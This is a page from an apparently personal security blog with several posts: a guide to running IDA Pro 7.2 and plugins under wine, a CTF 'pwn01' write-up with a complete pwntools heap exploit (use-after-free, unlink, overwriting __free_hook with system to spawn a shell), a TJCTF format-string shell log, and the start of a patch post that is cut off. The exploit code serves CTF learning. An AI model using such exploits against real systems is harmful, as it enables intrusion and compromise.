<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="English">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="One people that no one know">
<meta property="og:type" content="website">
<meta property="og:title" content="NoOne-hub">
<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;page&#x2F;3&#x2F;index.html">
<meta property="og:site_name" content="NoOne-hub">
<meta property="og:description" content="One people that no one know">
<meta property="og:locale" content="English">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://noone-hub.github.io/page/3/"/>





  <title>NoOne-hub</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="English">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NoOne-hub</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">A place that No One knw</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/ida/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/ida/" itemprop="url">pwn/ida</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p>
<p>这篇算是对我的那个环境配置的补充吧<br><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">环境配置篇</a></p>
<h2 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h2><p>这里建议呢，安装winehq-stable版本<br><a href="https://wiki.winehq.org/Download" target="_blank" rel="noopener">官网下载地址</a></p>
<p>官网选后会有文档指示如何安装，这里我用的是debian发行版，所以我按我的来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo apt-key add winehq.key</span><br></pre></td></tr></table></figure>
<p>然后添加源，这里位置不尽相同,自行添加了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb https://dl.winehq.org/wine-builds/debian/ buster main</span><br></pre></td></tr></table></figure>
<p>更新源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<p>安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-recommends winehq-stable</span><br></pre></td></tr></table></figure>

<h2 id="下载ida-pro-7-2安装包"><a href="#下载ida-pro-7-2安装包" class="headerlink" title="下载ida pro 7.2安装包"></a>下载ida pro 7.2安装包</h2><p>这里相信各路神仙会有自己的办法的</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里假设安装包为ida.exe</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida.exe</span><br></pre></td></tr></table></figure>
<p>然后windows的安装操作各位会吧，一路next也可以，安装完会提示安装python，也安装<br>然后转到.wine目录下的ida目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/<span class="string">'Program Files'</span>/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>ls结果如下<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6go7eabbkj30f301gq2z.jpg" alt="20190829172100.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">'IDA 7.2'</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida64</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gobufrcmj30nj0h0abu.jpg" alt="20190829172516.png"><br>就运行成功了，到这里其实ida安装算完成了，可还要折腾插件啊，还有一些东西要折腾的可以参照<br><a href="https://bbs.pediy.com/thread-252208.htm" target="_blank" rel="noopener">看雪大佬的文章</a><br>就是做些替换工作</p>
<p>对我来说方便的插件</p>
<ol>
<li>lazyida</li>
<li>findcrypt</li>
<li>HrDevHelper</li>
<li>IDASkins</li>
<li>hexlight<br>具体介绍可以从这里看到<a href="https://github.com/onethawt/idaplugins-list" target="_blank" rel="noopener">idaplugins-list</a></li>
</ol>
<p>这里比较难装的就是findcrypt了，最主要他要自己装个python库，我原来的思路是从虚拟机共享文件夹，然后设置环境变量来pip install yara<br>现在我发觉更简单的方法了,先按照原来的方法到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wine64 easy_install-2.7.exe  yara</span><br><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/Python27/Scripts</span><br><span class="line">wine64 easy_install-2.7.exe  yara</span><br></pre></td></tr></table></figure>
<p>这样便安装成了</p>
<p>然后插件全放到ida7.2目录下的plugins里就成了<br>最终分享下界面</p>
<h2 id="界面share"><a href="#界面share" class="headerlink" title="界面share"></a>界面share</h2><ol>
<li><p>idaskin加hexlight高亮<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gotziju8j30rb0ipju8.jpg" alt="20190829174242.png"></p>
</li>
<li><p>HrDevHelper的树型图<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6govgs0voj317o0lsn1d.jpg" alt="20190829174408.png"></p>
</li>
<li><p>lazyida dump数据<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gox6396wj30fe02swef.jpg" alt="20190829174546.png"></p>
</li>
<li><p>至于findcrypt和lazyida的查找格式化字符串漏洞的就不截图了</p>
</li>
<li><p>dysnc我截图不了就算了，手机拍糊了点<br>最主要是要有一个好看的皮囊啊，我感觉这样配置下来比原来的好看多了</p>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-01-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-01-wp/" itemprop="url">pwn/pwn-01-wp</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn01"><a href="#pwn01" class="headerlink" title="pwn01"></a>pwn01</h1><p>题目中wp已经写的很明白了</p>
<ol>
<li>检查题目保护，除了PIE，其他保护均打开</li>
<li>使用IDA分析函数，发现在free掉堆后没有对指针清零，存在UAF漏洞</li>
<li>编写exp.py，先申请7个0x20大小的堆，连续释放两个，这两个会形成fastbin的单向链表，通过UAF漏洞泄露出堆地址</li>
<li>在堆中伪造一个small chunk并将其释放，触发unlink操作，修改指向chunk的指针</li>
<li>已经可以控制任意地址读写，先修改edit限制，然后读GOT表，将system的地址填入__free_hook地址中，然后释放内容为“/bin/sh\x00”的堆，就获得了shell</li>
</ol>
<p>具体解释下</p>
<h2 id="密码检测部分"><a href="#密码检测部分" class="headerlink" title="密码检测部分"></a>密码检测部分</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(['./library'],env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)</span></span><br><span class="line">p = remote(<span class="string">"172.29.14.115"</span>, <span class="number">8888</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span><span class="params">(cipher)</span>:</span></span><br><span class="line">	key=[<span class="number">61</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">167</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">229</span>]</span><br><span class="line">	keyposs=[[] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xa3</span>):</span><br><span class="line">		ciphermid=cipher+(i&lt;&lt;<span class="number">32</span>)</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">				<span class="keyword">if</span> ciphermid % k == <span class="number">0</span>:</span><br><span class="line">					ciphermid=ciphermid//k</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> ciphermid <span class="keyword">in</span> range(<span class="number">64</span>,<span class="number">263</span>):</span><br><span class="line">			cipher=ciphermid</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>

<h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'1'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'the book:'</span>)</span><br><span class="line">    p.writeline(b)</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(a)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'4'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'2'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'new name of the book:'</span>)</span><br><span class="line">    p.writeline(b)</span><br><span class="line">    p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="密码验证"><a href="#密码验证" class="headerlink" title="密码验证"></a>密码验证</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	cipher=p.recv()[:<span class="number">-1</span>]</span><br><span class="line">	cipher=int(cipher,<span class="number">16</span>)</span><br><span class="line">	password=cal(cipher)</span><br><span class="line">	p.sendline(str(password))</span><br></pre></td></tr></table></figure>

<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.readuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">new(<span class="number">1</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>+chr(<span class="number">0x31</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">6</span>,<span class="string">''</span>)</span><br><span class="line">new(<span class="number">7</span>,<span class="string">''</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">heap=u64((p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,chr(<span class="number">0x0</span>)))<span class="number">-0x30</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0xa0</span>))</span><br></pre></td></tr></table></figure>

<h2 id="通过smallbin修改free-hook地址，改成system，从而达到目的"><a href="#通过smallbin修改free-hook地址，改成system，从而达到目的" class="headerlink" title="通过smallbin修改free_hook地址，改成system，从而达到目的"></a>通过smallbin修改free_hook地址，改成system，从而达到目的</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0x90</span>)*<span class="number">3</span>+chr(<span class="number">0x90</span>)</span><br><span class="line">new(<span class="number">8</span>,<span class="string">''</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0x4040a8</span><span class="number">-0x18</span>)+p32(<span class="number">0x4040a8</span><span class="number">-0x10</span>)</span><br><span class="line">new(<span class="number">9</span>,payload)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b *0x401513')</span></span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0x404040</span>)+p64(<span class="number">0x403f90</span>)+p64(<span class="number">0x404090</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0xff</span>))</span><br><span class="line">p.writeline(<span class="string">'3'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'7'</span>)</span><br><span class="line">free_addr=u64((p.readuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,chr(<span class="number">0x0</span>)))</span><br><span class="line">free_hook=free_addr+libc.symbols[<span class="string">'__free_hook'</span>]-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system=(free_addr+libc.symbols[<span class="string">'system'</span>]-libc.symbols[<span class="string">'free'</span>])</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.writeline(<span class="string">'4'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Index:'</span>)</span><br><span class="line">p.writeline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<p>其实就是uaf洞的原因，修复的话，将uaf改掉即可</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/tjctf2019/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/tjctf2019/" itemprop="url">pwn/tjctf2019</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;#                                                           �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$  </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-01-patch/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-01-patch/" itemprop="url">pwn/pwn-01-patch</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn01修复"><a href="#pwn01修复" class="headerlink" title="pwn01修复"></a>pwn01修复</h1><p>uaf洞很明显，free后没有置空，所以只要把free后置空就完了</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a1, <span class="keyword">const</span> 